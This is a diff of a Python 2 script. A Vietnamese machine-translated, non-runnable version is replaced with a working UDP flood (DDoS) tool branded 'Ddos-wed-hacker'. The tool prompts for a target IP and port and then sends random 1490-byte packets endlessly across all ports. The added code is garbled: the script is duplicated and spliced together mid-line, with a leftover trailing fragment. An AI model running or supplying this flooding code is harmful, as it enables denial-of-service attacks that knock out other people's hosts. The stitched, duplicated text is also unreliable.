@@ -1,50 +1,100 @@
-nhập  hệ thống
-nhập khẩu  os
- thời gian nhập khẩu
- ổ cắm nhập khẩu
-nhập  ngẫu nhiên
+import sys
+import os
+import time
+import socket
+import random
 #Code Time
-từ  datetime  nhập  datetime
-tại  =  datetime . bây giờ ()
-giờ  =  bây giờ . giờ
-phút  =  bây giờ . phút
-ngày  =  bây giờ . ngày
-tháng  =  bây giờ . tháng
-năm  =  bây giờ . năm
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 
 ##############
-sock  =  ổ cắm . ổ cắm ( ổ cắm . AF_INET , ổ cắm . SOCK_DGRAM )
-byte  =  ngẫu nhiên . _urandom ( 1490 )
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
 #############
 
-hệ điều hành . hệ thống ( "rõ ràng" )
-hệ điều hành . hệ thống ( "Hình tấn công DDos" )
-in
-print  "Tác giả: Truong-Thach"
-print  https://facebook.com/verify.truongthach9999"
-print  "github: https://github.com/truongthach2006"
-in 
-in
-ip  =  raw_input ( "Mục tiêu IP:" )
-port  =  đầu vào ( "Cổng:" )
+os.system("clear")
+os.system("figlet Ddos-wed-hacker")
+print
+print "Author   : Truong-Thach"
+print "You Tube : https://www.youtube.com/c/HA-MRX"import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 
-hệ điều hành . hệ thống ( "rõ ràng" )
-hệ điều hành . hệ thống ( "Bắt đầu tấn công bằng figlet" )
-in  "[] 0%"
-thời gian . ngủ ( 5 )
-in  "[=====] 25%"
-thời gian .ngủ ( 5 )
-in  "[==========] 50%"
-thời gian .ngủ ( 5 )
-in  "[===============] 75%"
-thời gian .ngủ ( 5 )
-in  "[====================] 100%"
-thời gian . ngủ ( 3 )
-đã gửi  =  0
-trong khi  Đúng :
-     tất . sendto ( byte , ( ip , cổng ))
-     đã gửi  =  đã gửi  +  1
-     port  =  port  +  1
-     in  "Đã gửi gói tin% s tới cổng% s:% s" % ( đã gửi , ip , cổng )
-     nếu  cổng  ==  65534 :
-       cổng  =  1
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet Ddos-wed-hacker")
+print
+print "Author   : Truong-Thach"
+print "You Tube : https://www.youtube.com/c/TruongThach"
+print "github   : https://github.com/TruongThach2006"
+print "Facebook : https://www.facebook.com/verify.truongthach9999"
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
+print "github   : https://github.com/TruongThach"
+print "Facebook : https://www.facebook.com/verify.truongthach9999"
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
